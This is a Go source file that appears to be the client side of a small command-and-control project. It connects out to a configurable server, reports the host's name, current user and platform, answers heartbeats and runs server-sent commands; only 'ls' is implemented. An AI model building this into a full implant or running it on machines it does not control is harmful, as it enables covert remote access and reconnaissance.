package main

import (
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/user"
	"phase3/client/cmds"
	"phase3/pb"
	"phase3/server/commands"
	"runtime"
	"time"

	"github.com/projectdiscovery/goflags"
	"google.golang.org/protobuf/proto"
)

type target struct {
	host string
	port int
}

func main() {
	opt := &target{}

	flagSet := goflags.NewFlagSet()

	flagSet.StringVar(&opt.host, "host", "0.0.0.0", "ip to connect to")
	flagSet.IntVarP(&opt.port, "port", "p", 1334, "port to connect to")

	if err := flagSet.Parse(); err != nil {
		log.Fatal(err)
	}

	client(opt.host, uint32(opt.port))
}

func client(ip string, port uint32) {
	fmt.Printf("ip: %s\n", ip)
	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", ip, port))
	if err != nil {
		log.Fatalf("connect err: %v\n", err)
	}

	write := make(chan *pb.Envelope)
	wait := make(chan bool)

	// Write when chan write get a message
	go func() {
		defer func() {
			wait <- true
		}()
		for {
			envelope, ok := <-write
			if !ok {
				return
			}
			err := commands.WriteEnvelope(conn, envelope)
			if err != nil {
				return
			}

		}
	}()
	// Read loop
	go func() {
		defer func() {
			wait <- true
		}()
		for {
			envelope, err := commands.ReadEnvelope(conn)
			if err == io.EOF {
				log.Printf("[tcp] eof")
				return
			}
			if err != io.EOF && err != nil {
				log.Printf("[tcp] break")
				break
			}
			// Handler for received Message
			clientHandler(envelope, conn)
		}
	}()

	// send session info first
	time.Sleep(1 * time.Second)
	sessionInfo(conn)

	<-wait
}

func clientHandler(env *pb.Envelope, conn net.Conn) {

	switch env.Type {
	// heartbeat
	case 0:
		commands.WriteEnvelope(conn, &pb.Envelope{
			ID:   0,
			Type: 0,
			Data: []byte("ping"),
		})

	// cmd Message
	case 1:
		fmt.Printf("[%s] %s\n", conn.RemoteAddr(), env.GetData())
		switch string(env.GetData()) {
		case "ls":
			cmds.Ls(conn)

		}

	// ServerInfo
	case 2:

		hostname, err := os.Hostname()
		if err != nil {
			hostname = "-"
		}
		user, _ := user.Current()
		system := fmt.Sprintf("%s-%s", runtime.GOOS, runtime.GOARCH)
		fmt.Println("system is", system)
		infopb := &pb.SessionInfo{
			ID:       1,
			System:   system,
			Username: user.Username,
			Hostname: hostname,
		}

		sessioninfo, err := proto.Marshal(infopb)
		if err != nil {
			fmt.Printf("Envelope marshaling error: %v\n", err)
		}

		commands.WriteEnvelope(conn, &pb.Envelope{
			ID:   0,
			Type: 2,
			Data: sessioninfo,
		})
	}
}

func sessionInfo(conn net.Conn) {
	hostname, err := os.Hostname()
	if err != nil {
		hostname = "-"
	}
	user, _ := user.Current()
	system := fmt.Sprintf("%s-%s", runtime.GOOS, runtime.GOARCH)
	infopb := &pb.SessionInfo{
		ID:       1,
		System:   system,
		Username: user.Username,
		Hostname: hostname,
	}

	sessioninfo, err := proto.Marshal(infopb)
	if err != nil {
		fmt.Printf("Envelope marshaling error: %v\n", err)
	}

	commands.WriteEnvelope(conn, &pb.Envelope{
		ID:   0,
		Type: 2,
		Data: sessioninfo,
	})
}
